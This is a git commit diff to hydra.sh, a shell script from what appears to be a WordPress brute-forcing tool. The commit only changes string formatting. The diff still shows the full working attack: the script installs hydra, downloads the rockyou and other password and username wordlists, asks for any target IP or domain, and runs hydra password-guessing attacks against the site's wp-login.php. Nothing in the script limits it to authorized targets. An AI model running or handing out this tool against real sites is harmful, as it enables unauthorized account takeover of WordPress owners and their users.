dce031bf8081b1462fa49c9a455a0b111883016e
ivimla <118000989+ivimla@users.noreply.github.com>
2022-11-15 18:22:15 +0100

    join multi-strings
    join mult-strings to single string where single echo present

--- hydra.sh
+++ hydra.sh
@@ -9,9 +9,9 @@ readonly GREEN='\u001b[32m' # Green
 readonly NC='\033[0m'       # Neutral (White)
 
 # variables for wordlists
-readonly ROCKYOU="$HOME""/wpbruteforcer/wordlists/rockyou.txt"
-readonly ONEMILPWLIST="$HOME""/wpbruteforcer/wordlists/1milpwlist.txt"
-readonly USERNAMELIST="$HOME""/wpbruteforcer/wordlists/usernames.txt"
+readonly ROCKYOU="${HOME}/wpbruteforcer/wordlists/rockyou.txt"
+readonly ONEMILPWLIST="${HOME}/wpbruteforcer/wordlists/1milpwlist.txt"
+readonly USERNAMELIST="${HOME}/wpbruteforcer/wordlists/usernames.txt"
 
 echo '___       __   ________  ________  ________  ___  ___  _________  ________ ________  ________  ________  _______   ________'
 echo '|\  \     |\  \|\   __  \|\   __  \|\   __  \|\  \|\  \|\___   ___\\  _____\\   __  \|\   __  \|\   ____\|\  ___ \ |\   __  \'
@@ -32,7 +32,7 @@ echo '             \|___|/             \|_________|                             
 
 getdependencies () {
     # install required packages
-    echo -e "$GREEN""\ndownloading required packages...""$NC"
+    echo -e "${GREEN}\ndownloading required packages...${NC}"
     sudo apt install hydra
 
     # create directories and files
@@ -40,13 +40,13 @@ getdependencies () {
     mkdir ~/wpbruteforcer/wordlists
 
     # download wordlists
-    echo -e "$GREEN""downloading wordlists...""$NC"
+    echo -e "${GREEN}downloading wordlists...${NC}"
     wget -q https://github.com/Sephley/WPbruteforcer/raw/main/wordlists/rockyou.txt.gz -O ~/wpbruteforcer/wordlists/rockyou.txt.gz
     wget -q https://github.com/Sephley/WPbruteforcer/raw/main/wordlists/1milpwlist.txt -O ~/wpbruteforcer/wordlists/1milpwlist.txt
     wget -q https://raw.githubusercontent.com/Sephley/WPbruteforcer/main/wordlists/usernames.txt -O ~/wpbruteforcer/wordlists/usernames.txt
 
     # de-compress rockyou.txt
-    echo -e "$GREEN""de-compressing wordlists...""$NC"
+    echo -e "${GREEN}de-compressing wordlists...${NC}"
     gzip -d ~/wpbruteforcer/wordlists/rockyou.txt.gz
     rm ~/wpbruteforcer/wordlists/rockyou.txt.gz
 }
@@ -54,10 +54,10 @@ getdependencies () {
 # brute-force using both a username & a password wordlist
 hydrausernamewordlist () {
     if [ "$REPLY" == 1 ]; then 
-        echo -e "$GREEN""you picked the following wordlist: rockyou.txt""$NC"
+        echo -e "${GREEN}you picked the following wordlist: rockyou.txt${NC}"
         hydra -L "$USERNAMELIST" -P "$ROCKYOU" "$NETWORKADDRESS" -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=dashboard' # last string specifies error message, cookie and destination (S=dashboard is destination)
     else
-        echo -e "$GREEN""you picked the following wordlist: 1milpwlist.txt""$NC"
+        echo -e "${GREEN}you picked the following wordlist: 1milpwlist.txt${NC}"
         hydra -L "$USERNAMELIST" -P "$ONEMILPWLIST" "$NETWORKADDRESS" -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=dashboard'
         exit 0
     fi
@@ -66,10 +66,10 @@ hydrausernamewordlist () {
 # brute-force using specified username & a password wordlist
 hydraspecificusername () {
     if [ "$REPLY" == 1 ]; then 
-        echo -e "$GREEN""you picked the following wordlist: rockyou.txt""$NC"
+        echo -e "${GREEN}you picked the following wordlist: rockyou.txt${NC}"
         hydra -l "$USERNAME" -P "$ROCKYOU" "$NETWORKADDRESS" -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=dashboard'
     else 
-        echo -e "$GREEN""you picked the following wordlist: 1milpwlist.txt""$NC"
+        echo -e "${GREEN}you picked the following wordlist: 1milpwlist.txt${NC}"
         hydra -l "$USERNAME" -P "$ONEMILPWLIST" "$NETWORKADDRESS" -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=dashboard'
         exit 0
     fi
@@ -77,29 +77,29 @@ hydraspecificusername () {
 
 # prompt user to enter IP-Address or FQDN
 getnetworkaddress () {
-    echo -e "$GREEN""type your destined IP-Address or FQDN: ""$NC"
+    echo -e "${GREEN}type your destined IP-Address or FQDN:${NC}"
     read -r NETWORKADDRESS
 }
 
 # Select one of two password wordlists to use
 getpwwordlist () {
-    echo -e "$GREEN""select the password wordlist you would like to use\n""$NC"
+    echo -e "${GREEN}select the password wordlist you would like to use\n${NC}"
     select d in rockyou.txt 1milpwlist.txt; 
     do test -n "$d" && break; # sends error message if answer is invalid
-    echo -e "$RED>>> Invalid Selection""$NC"; done
+    echo -e "${RED}>>> Invalid Selection${NC}"; done
 }
 
 # ask if use would like to specify a wordlist, or use a username wordlist
 getusernamewordlist () {
-    echo -e "$GREEN""would you like to use a username wordlist, or would you like to try a specific one?\n""$NC"
+    echo -e "${GREEN}would you like to use a username wordlist, or would you like to try a specific one?${NC}"
     select w in 'I want to use a wordlist' 'I want to try a specific username'; 
     do test -n "$w" && break; 
-    echo -e "$RED>>> Invalid Selection""$NC"; done
+    echo -e "${RED}>>> Invalid Selection${NC}"; done
 }
 
 specifyusername () {
     if [ "$REPLY" == 2 ]; then
-        echo -e "$GREEN""enter username: ""$NC"
+        echo -e "${GREEN}enter username:${NC}"
         read -r USERNAME
     else
         getpwwordlist
